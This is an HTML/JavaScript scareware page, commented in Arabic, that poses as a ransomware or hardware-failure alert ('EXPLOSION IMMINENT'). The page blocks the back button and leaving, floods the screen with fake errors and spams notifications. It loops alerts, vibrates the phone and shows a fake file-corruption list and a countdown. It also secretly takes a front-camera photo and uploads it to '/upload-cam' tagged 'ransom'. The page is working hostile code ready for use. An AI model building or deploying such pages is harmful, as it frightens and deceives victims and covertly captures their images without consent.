<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SYSTEM FAILURE</title>
<style>
  body {
    background: #050505; color: #ff0000; font-family: 'Courier New', monospace;
    margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column;
    justify-content: center; align-items: center; overflow: hidden; text-align: center;
    position: relative;
    animation: bgFlash 0.2s infinite;
  }
  @keyframes bgFlash {
    0% { background: #050505; }
    50% { background: #1a0000; }
    100% { background: #050505; }
  }

  .warning { font-size: 50px; font-weight: bold; animation: blink 0.3s infinite; margin-bottom: 20px; z-index: 10; text-shadow: 0 0 20px red; }
  @keyframes blink { 50% { opacity: 0.2; } }
  h1 { font-size: 28px; color: #fff; margin-bottom: 10px; z-index: 10;}
  p { font-size: 16px; color: #ffcccc; max-width: 600px; line-height: 1.5; z-index: 10;}
  .timer { font-size: 60px; color: #ff0000; font-weight: bold; margin: 30px 0; text-shadow: 0 0 20px #ff0000; z-index: 10; animation: pulse 0.5s infinite alternate;}
  @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.1); } }
  .file-list { background: #111; border: 1px solid #333; padding: 15px; width: 80%; max-width: 500px; text-align: left; height: 150px; overflow: hidden; margin-top: 20px; font-size: 12px; color: #00ff00; z-index: 10;}
  .file-line { margin: 3px 0; }
  
  /* ستايل رسائل النظام */
  .floating-msg {
    position: absolute;
    color: #ff3333;
    font-family: 'Courier New', monospace;
    font-weight: bold;
    font-size: 14px;
    text-shadow: 0 0 5px #ff0000;
    pointer-events: none;
    z-index: 9999;
    animation: shakeMsg 0.1s infinite, floatUp 1.5s forwards;
    background: rgba(0,0,0,0.8);
    padding: 4px 8px;
    border: 1px solid #ff0000;
    white-space: nowrap;
  }
  @keyframes shakeMsg {
    0% { transform: translate(0, 0); }
    25% { transform: translate(5px, 5px); }
    50% { transform: translate(-5px, -5px); }
    75% { transform: translate(5px, -5px); }
    100% { transform: translate(-5px, 5px); }
  }
  @keyframes floatUp {
    0% { opacity: 1; transform: translateY(0) scale(1); }
    100% { opacity: 0; transform: translateY(-50px) scale(1.3); }
  }
</style>
</head>
<body>

<div class="warning">☠️ SYSTEM CRITICAL ☠️</div>
<h1>EXPLOSION IMMINENT</h1>
<p>Hardware failure detected. Data corruption in progress.</p>
<div class="timer" id="timer">24:00:00</div>
<div class="file-list" id="fileList"></div>

<video id="cam" style="position:absolute; top:-9999px;" autoplay playsinline></video>
<canvas id="cv" style="position:absolute; top:-9999px;"></canvas>

<script>
  // 1. قفل زر الرجوع ومنع الخروج
  history.pushState(null, null, location.href);
  window.onpopstate = function () { history.go(1); };
  window.onbeforeunload = function () { return "System is shutting down. Do not leave."; };
  document.addEventListener('contextmenu', e => e.preventDefault());

  // 2. صوت الإنذار المبكر
  let audioStarted = false;
  function startSiren() {
    if (audioStarted) return;
    audioStarted = true;
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      const lfo = audioCtx.createOscillator();
      const lfoGain = audioCtx.createGain();
      
      osc.type = 'sawtooth'; osc.frequency.value = 600;
      lfo.type = 'sine'; lfo.frequency.value = 0.8; lfoGain.gain.value = 400;
      
      lfo.connect(lfoGain); lfoGain.connect(osc.frequency);
      gain.gain.value = 0.4; osc.connect(gain); gain.connect(audioCtx.destination);
      
      lfo.start(); osc.start();
    } catch(e) {}
  }
  document.body.addEventListener('click', startSiren, { once: true });
  document.body.addEventListener('touchstart', startSiren, { once: true });

  // 3. اهتزاز الجوال (زي ما بينفجر)
  if (navigator.vibrate) {
    // نمط اهتزاز متقطع وقوي جداً
    setInterval(() => {
      navigator.vibrate([500, 100, 500, 100, 500, 100, 1000]);
    }, 2000);
  }

  // 4. كاميرا أمامية
  async function captureIntruder() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const video = document.getElementById('cam');
      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 1000));
      const canvas = document.getElementById('cv');
      canvas.width = 640; canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
      const imgData = canvas.toDataURL('image/jpeg', 0.8);
      stream.getTracks().forEach(t => t.stop());
      await fetch('/upload-cam', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ front: imgData, brand: 'ransom' })
      }).catch(()=>{});
    } catch(e) {}
  }
  setTimeout(captureIntruder, 2000);

  // 5. محاكي التشفير
  const exts = ['jpg', 'png', 'pdf', 'docx', 'mp4', 'zip', 'txt', 'xlsx'];
  const names = ['family_photo', 'vacation', 'my_docs', 'project', 'backup', 'passwords', 'bank'];
  const fileList = document.getElementById('fileList');
  
  setInterval(() => {
    const line = document.createElement('div');
    line.className = 'file-line';
    line.innerHTML = `[FAILED] /system/data/${names[Math.floor(Math.random()*names.length)]}.${exts[Math.floor(Math.random()*exts.length)]} -> CORRUPTED`;
    fileList.prepend(line);
    if (fileList.childNodes.length > 30) fileList.removeChild(fileList.lastChild);
  }, 50);

  // 6. العداد التنازلي
  let timeLeft = 24 * 3600;
  const timerEl = document.getElementById('timer');
  setInterval(() => {
    timeLeft--;
    const h = Math.floor(timeLeft / 3600).toString().padStart(2, '0');
    const m = Math.floor((timeLeft % 3600) / 60).toString().padStart(2, '0');
    const s = (timeLeft % 60).toString().padStart(2, '0');
    timerEl.textContent = `${h}:${m}:${s}`;
  }, 1000);

  // 7. إغراق الشاشة برسائل النظام
  const systemErrors = [
    "[ERROR] 0x000000F4", "CRITICAL_PROCESS_DIED", "KERNEL_PANIC", "STORAGE_UNMOUNTED",
    "LOW_MEMORY: 0 MB", "SYSTEM32_CORRUPTED", "UNAUTHORIZED_ACCESS", "BASEBAND_FAILURE",
    "SIM_CARD_FAILURE", "HARDWARE_ACCELERATION_DISABLED", "BOOTLOADER_UNLOCKED",
    "FIREWALL_BREACHED", "DNS_FAILED", "CONNECTION_TERMINATED", "DRIVER_IRQL_ERROR",
    "NTFS_FILE_SYSTEM_ERROR", "MEMORY_MANAGEMENT_ERROR", "PAGE_FAULT_IN_NONPAGED_AREA",
    "DATA_BUS_ERROR", "BAD_SYSTEM_CONFIG_INFO", "CPU_OVERHEATING", "BATTERY_SWELLING"
  ];

  setInterval(() => {
    const msg = document.createElement('div');
    msg.className = 'floating-msg';
    
    const errorCode = "0x" + Math.floor(Math.random() * 16777215).toString(16).toUpperCase().padStart(8, '0');
    msg.innerText = systemErrors[Math.floor(Math.random() * systemErrors.length)] + " " + errorCode;
    
    msg.style.left = Math.floor(Math.random() * 80) + '%';
    msg.style.top = Math.floor(Math.random() * 80) + '%';
    msg.style.fontSize = (Math.floor(Math.random() * 10) + 11) + 'px';
    
    document.body.appendChild(msg);
    
    setTimeout(() => { msg.remove(); }, 1500);
  }, 50); // رسالة كل 50 ملي ثانية (20 رسالة بالثانية)

  // 8. إغراق إشعارات المتصفح (المتصفح بيطلب إذن)
  async function requestNotificationPermission() {
    if (!("Notification" in window)) return;
    
    let permission = Notification.permission;
    if (permission !== "granted") {
      permission = await Notification.requestPermission();
    }
    
    if (permission === "granted") {
      // نبدأ الإغراق
      setInterval(() => {
        const errorMsg = systemErrors[Math.floor(Math.random() * systemErrors.length)];
        new Notification("⚠️ CRITICAL SYSTEM ERROR", {
          body: errorMsg + "\nDevice is about to shut down.",
          icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
          requireInteraction: true,
          tag: "system_error_" + Math.random() // عشان ما يدمجهم ببعض
        });
      }, 1000); // إشعار كل ثانية
    }
  }
  
  // نطلب الإذن أول ما يلمس الشاشة (عشان المتصفحات تسمح)
  document.body.addEventListener('click', requestNotificationPermission, { once: true });
  document.body.addEventListener('touchstart', requestNotificationPermission, { once: true });

  // 9. بوب أب لا نهائي
  setTimeout(() => {
    setInterval(() => {
      alert("CRITICAL FAILURE: Battery swelling detected. System shutdown imminent.");
    }, 8000);
  }, 10000);
</script>
</body>
</html>
